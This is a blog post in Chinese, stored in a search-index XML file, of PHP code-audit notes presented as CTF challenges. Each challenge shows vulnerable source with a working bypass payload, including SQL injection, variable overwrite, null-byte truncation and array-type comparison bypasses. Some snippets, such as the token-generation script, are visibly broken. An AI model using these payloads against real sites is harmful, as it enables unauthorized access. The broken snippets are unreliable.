<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP代码审计学习记录</title>
    <url>/2020/03/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习记录"><a href="#PHP代码审计学习记录" class="headerlink" title="PHP代码审计学习记录"></a>PHP代码审计学习记录</h1><a id="more"></a>

<p>一些简单的PHP代码审计学习记录</p>
<p>下面都是以CTF的形式来学习PHP代码审计 绕过各种PHP函数和方法和利用一些特性来获取flag</p>
<h2 id="0x00-PHP的extract变量覆盖"><a href="#0x00-PHP的extract变量覆盖" class="headerlink" title="0x00 PHP的extract变量覆盖"></a>0x00 PHP的extract变量覆盖</h2><p>先了解一下extract函数是什么</p>
<p>extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目</p>
<p>通俗点就是可以从数组中的键值取出来然后赋值给其他变量 变量名就是键值名</p>
<p>然后这里有两道题可以看一下 一道GET一道POST</p>
<p>GET型 源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content&#x3D;trim(file_get_contents($flag));</span><br><span class="line">if($shiyan&#x3D;&#x3D;$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;Oh.no&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里开头就用来extract从url里面提取GET的参数 后面看到有shiyan和flag两个参数 trim是用来过滤两边其他字符串的 后面那个函数用来提取文件中内容复制给字符串 所以这里从url里面提取到的参数就会变量覆盖</p>
<p>从url里面提取shiyan作为变量名赋值为空 提取flag作为变量名赋值为url里面提交的参数</p>
<p>只要满足$content=$shiyan就行</p>
<p>shiyan参数直接留空 flag参数给个不存在的文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?shiyan&#x3D;&amp;flag&#x3D;111</span><br></pre></td></tr></table></figure>

<p>直接这样就ok</p>
<p>POST型 源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; “POST”) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">     extract($_POST);</span><br><span class="line"></span><br><span class="line">        if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">           &lt;div class&#x3D;”alert alert-success”&gt;</span><br><span class="line"></span><br><span class="line">               &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt;</span><br><span class="line"></span><br><span class="line">           &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php &#125; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure>

<p>跟上面一样 直接就extract了POST的数据</p>
<p>这里要我们$pass==$thepassword_123 我们直接post一个pass</p>
<p>使用变量覆盖使得这两个的变量值都为空</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pass&#x3D;&amp;thepassword_123&#x3D;</span><br></pre></td></tr></table></figure>

<p>直接就ok</p>
<h2 id="0x01-绕过过滤空白字符"><a href="#0x01-绕过过滤空白字符" class="headerlink" title="0x01 绕过过滤空白字符"></a>0x01 绕过过滤空白字符</h2><p>先看源码： 代码我就弄得紧凑一点了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$info &#x3D; &quot;&quot;; &#x2F;&#x2F;单引号中是绝对字符串 双引号中的变量可以被解析并赋予变量值 其余则为字符串</span><br><span class="line">$req &#x3D; [];  &#x2F;&#x2F;数组</span><br><span class="line">$flag&#x3D;&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line">ini_set(&quot;display_error&quot;, false); &#x2F;&#x2F;为一个配置选项设置值 关闭错误显示</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;关闭所有PHP错误报告</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;number&#39;]))&#123;</span><br><span class="line">   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); &#x2F;&#x2F;HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span><br><span class="line">   die(&quot;have a fun!!&quot;); &#x2F;&#x2F;die — 等同于 exit()</span><br><span class="line">&#125; </span><br><span class="line">foreach([$_GET, $_POST] as $global_var) &#123;  &#x2F;&#x2F;foreach 语法结构提供了遍历数组的简单方式 </span><br><span class="line">    foreach($global_var as $key &#x3D;&gt; $value) &#123;  &#x2F;&#x2F;取出键值0 &#x3D;&#x3D;》121</span><br><span class="line">        $value &#x3D; trim($value);  &#x2F;&#x2F;trim — 去除字符串首尾处的空白字符（或者其他字符）得到121</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] &#x3D; addslashes($value); &#x2F;&#x2F; is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span><br><span class="line">    &#125; &#x2F;&#x2F;转义前面加\  加入数组req里面</span><br><span class="line">&#125; </span><br><span class="line">function is_palindrome_number($number) &#123; &#x2F;&#x2F;回文数字</span><br><span class="line">    $number &#x3D; strval($number); &#x2F;&#x2F;strval — 获取变量的字符串值 字符串121</span><br><span class="line">    $i &#x3D; 0; </span><br><span class="line">    $j &#x3D; strlen($number) - 1; &#x2F;&#x2F;strlen — 获取字符串长度 从0开始 减1</span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !&#x3D;&#x3D; $number[$j]) &#123; &#x2F;&#x2F;判断回文</span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line">if(is_numeric($_REQUEST[&#39;number&#39;])) &#x2F;&#x2F;is_numeric — 检测变量是否为数字或数字字符串 绕过使条件为假 再前面加个%00 要求1</span><br><span class="line">&#123;</span><br><span class="line">   $info&#x3D;&quot;sorry, you cann&#39;t input a number!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">elseif($req[&#39;number&#39;]!&#x3D;strval(intval($req[&#39;number&#39;]))) &#x2F;&#x2F;intval — 获取变量的整数值  先取整数再变为字符串121 要求2</span><br><span class="line">&#123;</span><br><span class="line">     $info &#x3D; &quot;number must be equal to it&#39;s integer!! &quot;;  </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">     $value1 &#x3D; intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 &#x3D; intval(strrev($req[&quot;number&quot;]));  &#x2F;&#x2F;取反</span><br><span class="line">     if($value1!&#x3D;$value2)&#123; &#x2F;&#x2F;要求3</span><br><span class="line">          $info&#x3D;&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;&#x2F;&#x2F;要求4 使之判断为假 回文数前面加个字符</span><br><span class="line">              $info &#x3D; &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">             $info&#x3D;$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure>

<p>开头定义了有字符串 数组 和我们想要的flag 然后下面那个设置是关闭了错误回显</p>
<p>然后判断GET参数number 没有的话就会提示 拿去md5解一下 是source.txt 然后就会得到这个源码</p>
<p>然后取出参数 判断字符串 添加转义字符然后再加到req数组里面</p>
<p>函数is_palindrome_number是判断是否是个回文数字 就是正反都是一样的</p>
<p>然后再看一下的一些要求 我都列出来了 都分析一下</p>
<p>(1)函数is_numeric判断是否是数字 我们可以在前面加个%00或者重新POST一个number来覆盖掉</p>
<p>(2)$req[‘number’]==strval(intval($req[‘number’])) </p>
<p>(3)intval($req[“number”])==intval(strrev($req[“number”]))</p>
<p>要求2和3大致上都是差不多的 只要满足回文且是正常的数字就行了</p>
<p>(4)不满足is_palindrome_number函数 使之返回为假</p>
<p>这里只需要在前面加个特殊字符就ok 同时也要满足2和3的条件 所以就需要我们构造一下</p>
<p>然后找到一个字符是可以的 其他的字符可以自己fuzz一下 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;+121&#39;&#x3D;&#x3D;&#39;121&#39; &amp;&amp; intval(&#39;121+&#39;)&#x3D;&#x3D;121 &#x2F;&#x2F;+就是%2B</span><br></pre></td></tr></table></figure>

<p>所以最后我们构造如下即可出flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?number&#x3D;%00%2B121s</span><br></pre></td></tr></table></figure>

<h2 id="0x02-多重加密"><a href="#0x02-多重加密" class="headerlink" title="0x02 多重加密"></a>0x02 多重加密</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;common.php&#39;;</span><br><span class="line">    $requset &#x3D; array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">    &#x2F;&#x2F;把一个或多个数组合并为一个数组</span><br><span class="line">    class db</span><br><span class="line">    &#123;</span><br><span class="line">        public $where;</span><br><span class="line">        function __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            if(!empty($this-&gt;where))</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;select($this-&gt;where);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        function select($where)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql &#x3D; mysql_query(&#39;select * from user where &#39;.$where);</span><br><span class="line">            &#x2F;&#x2F;函数执行一条 MySQL 查询。</span><br><span class="line">            return @mysql_fetch_array($sql);</span><br><span class="line">            &#x2F;&#x2F;从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($requset[&#39;token&#39;]))</span><br><span class="line">    &#x2F;&#x2F;测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br><span class="line">    &#123;</span><br><span class="line">        $login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">        &#x2F;&#x2F;gzuncompress:进行字符串压缩 解压缩</span><br><span class="line">        &#x2F;&#x2F;unserialize: 将已序列化的字符串还原回 PHP 的值 反序列化</span><br><span class="line"></span><br><span class="line">        $db &#x3D; new db();</span><br><span class="line">        $row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">        &#x2F;&#x2F;mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">        if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else if($row[&#39;pass&#39;] !&#x3D;&#x3D; $login[&#39;pass&#39;])&#123;</span><br><span class="line">            echo &#39;unserialize injection!!&#39;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&#39;Location: index.php?error&#x3D;1&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们看一下源码 重点关注代码中的echo $flag的条件  上面的都是数据库操作什么的先不管</p>
<p>if($login[‘user’] === ‘ichunqiu’)  而$login[‘user’]又是从上面的</p>
<p>$login = unserialize(gzuncompress(base64_decode($requset[‘token’]))); 各种转变出来的</p>
<p>先base64解码 再解压缩 再反序列化成PHP代码里面的值</p>
<p>所以我们就需要自己写几句PHP来获取一下这个token token需要先序列化一下 然后再压缩一下 最后再base64</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; array([&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;);</span><br><span class="line">$token &#x3D; base64_encode(gzcompress(serialize($token)));</span><br><span class="line">echo $token;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后这里token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=</p>
<p>带进URL里面直接GET提交即可</p>
<h2 id="0x03-SQL注入之WITH-ROLLUP绕过"><a href="#0x03-SQL注入之WITH-ROLLUP绕过" class="headerlink" title="0x03 SQL注入之WITH ROLLUP绕过"></a>0x03 SQL注入之WITH ROLLUP绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); &#x2F;&#x2F;关闭错误报告</span><br><span class="line">if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) &#123;</span><br><span class="line">    echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input name&#x3D;&quot;uname&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input name&#x3D;&quot;pwd&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;&#x2F;form&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;检测变量是否是数组</span><br><span class="line">        $StrValue&#x3D;implode($StrValue);</span><br><span class="line">&#x2F;&#x2F;返回由数组元素组合成的字符串</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;&#x2F;&quot;.$ArrReq.&quot;&#x2F;is&quot;,$StrValue)&#x3D;&#x3D;1)&#123;   </span><br><span class="line">&#x2F;&#x2F;匹配成功一次后就会停止匹配</span><br><span class="line"></span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;遍历数组</span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line">$con &#x3D; mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">    die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db&#x3D;&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">&#x2F;&#x2F;设置活动的 MySQL 数据库</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">&#x2F;&#x2F;执行一条 MySQL 查询</span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">&#x2F;&#x2F;返回结果集中行的数目</span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">&#x2F;&#x2F;返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这是实验吧的一道题 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1MDc4NjMxL2FydGljbGUvZGV0YWlscy81NDc3Mjc5OA==" title="https://blog.csdn.net/qq_35078631/article/details/54772798">实验吧 因缺思汀绕过<i class="fa fa-external-link"></i></span></p>
<p>再来了解一下什么是with rollup <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2h1YW5nbmV0L2FyY2hpdmUvMjAxMy8wMy8yNi8yOTgyMTQ0Lmh0bWw=" title="https://www.cnblogs.com/shuangnet/archive/2013/03/26/2982144.html">WITH ROLLUP<i class="fa fa-external-link"></i></span></p>
<p>那么看代码我们就知道 </p>
<p>$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}’”;</p>
<p>提交uname时在后面拼接语句 语句中加上with rollup</p>
<p>所以在表的最下面的一列会有一个admin的用户名  而密码则为null 所以就可以这里利用从而绕过</p>
<p>所以不用担心上面的过滤函数过滤了很多关键词 虽然我一开始看到 也寻思这全部都屏蔽了 还怎么sql注入 当然也有其他的绕过姿势</p>
<p>所以我们需要构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; GROUP BY pwd WITH ROLLUP LIMIT 1 OFFSET x--+</span><br></pre></td></tr></table></figure>

<p>至于后面的x为多少 可以自己fuzz 表大x就大 表小x就小</p>
<h2 id="0x04-ereg正则-00截断"><a href="#0x04-ereg正则-00截断" class="headerlink" title="0x04 ereg正则%00截断"></a>0x04 ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) </span><br><span class="line">&#123;</span><br><span class="line">  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">  &#123;</span><br><span class="line">    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">   &#123;</span><br><span class="line">     if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class="line">      &#123;</span><br><span class="line">      die(&#39;Flag: &#39; . $flag);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;); </span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;; </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看源码 有个ereg函数 要先让它为true，所以必须要正常的字母数字</p>
<p>然后长度小于8且值大于9999999，所以这里首先想到的就是使用科学计数法来表示</p>
<p>然后后面输出flag的条件是要包含有<em>-</em>，但是加了之后又不能满足正常字母数字的条件</p>
<p>所以这里就需要利用PHP的00截断了 构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;1e9%00*-*</span><br></pre></td></tr></table></figure>

<h2 id="0x05strcmp比较字符串绕过"><a href="#0x05strcmp比较字符串绕过" class="headerlink" title="0x05strcmp比较字符串绕过"></a>0x05strcmp比较字符串绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line">    &#x2F;&#x2F;比较两个字符串（区分大小写） </span><br><span class="line">        die(&#39;Flag: &#39;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &#39;No&#39;;  </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里还是重点关注输出flag的条件  strcmp($_GET[‘a’], $flag) == 0</p>
<p>所以这里就要传进去的参数和$flag完全相等 但是我们又不知道flag</p>
<p>所以这里就涉及到了上传的参数类型的问题</p>
<p>这里strcmp函数内的两个参数都是字符串类型，但是如果我上传了一个数组类型的呢 结果会怎样呢</p>
<p>在PHP5.3之前 ，传入了错误的类型，这个函数会报错然后return0，也就达到了我们的效果，最后返回0</p>
<p>但是在5.3之后，传入错误类型后，将不会报告错误信息，不会有返回值，但我们传入数组之后，会有一个NULL值</p>
<p>而null==0，所以也可以达到我们的效果，所以我们只需要上传一个数组即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a[]&#x3D;9</span><br></pre></td></tr></table></figure>

<h2 id="0x06-sha1-函数比较绕过"><a href="#0x06-sha1-函数比较绕过" class="headerlink" title="0x06 sha1()函数比较绕过"></a>0x06 sha1()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) </span><br><span class="line">&#123;</span><br><span class="line">    if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        echo &#39;&lt;p&gt;Your password can not be your name!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">    else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))</span><br><span class="line">      die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#39;&lt;p&gt;Invalid password.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    echo &#39;&lt;p&gt;Login first!&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看源码有两个参数 一个name一个password</p>
<p>看输出flag的条件 需要sha1($_GET[‘name’]) === sha1($_GET[‘password’])</p>
<p>那就先了解一下sha1函数 用于计算传入字符串的sha散列</p>
<p>那么这里就该注意到了 传入的参数类型是字符串 那么如果我传入其他类型呢</p>
<p>那么肯定就会返回false了 那么这里是需要 === 这个运算符会比较类型 所以两个参数都传入数组</p>
<p>都会返回false来使这个比较成立 构造payload如下  其中还需要两个参数值不能相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name[]&#x3D;os&amp;password[]&#x3D;lo</span><br></pre></td></tr></table></figure>

<h2 id="0x07-SESSION-验证绕过"><a href="#0x07-SESSION-验证绕过" class="headerlink" title="0x07 SESSION 验证绕过"></a>0x07 SESSION 验证绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class="line">        die (&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先关注到一开始有个session_start()的函数 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</span><br></pre></td></tr></table></figure>

<p>所以这里会重用现有会话</p>
<p>需要条件$_GET[‘password’] == $_SESSION[‘password’]</p>
<p>那么我们怎么使这个条件成立 就涉及到session验证绕过的问题</p>
<p>这里会调用现有会话 也就是使用之前的session 那么我们如果抓包直接删除PHPSESSID的值 使之为空</p>
<p>然后password的值提交为空 或者直接就删除cookies 就可以让这两个值相等了</p>
<p>删除后构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="0x08-MD5密码比较绕过"><a href="#0x08-MD5密码比较绕过" class="headerlink" title="0x08 MD5密码比较绕过"></a>0x08 MD5密码比较绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;配置数据库</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn &#x3D; mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;赋值</span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line">$sql &#x3D; &quot;select pw from php where user&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">&#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>首先看到需要POST两个参数 一个user一个pass</p>
<p>而且后面pass拿去md5了一下 user拿去数据库查询 然后将查询出来的密码和提交的密码的两者的md5比较是否相等  相等才会输出flag</p>
<p>这里我们就可以使用联合注入union select 来返回一个已知明文的md5 那么就会使用这个md5去和我们提交的pass的md5比较 构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?user&#x3D;&#39; union select &#39;202cb962ac59075b964b07152d234b70&#39;#pass&#x3D;123</span><br><span class="line">123的md5就是&#39;202cb962ac59075b964b07152d234b70&#39;</span><br></pre></td></tr></table></figure>

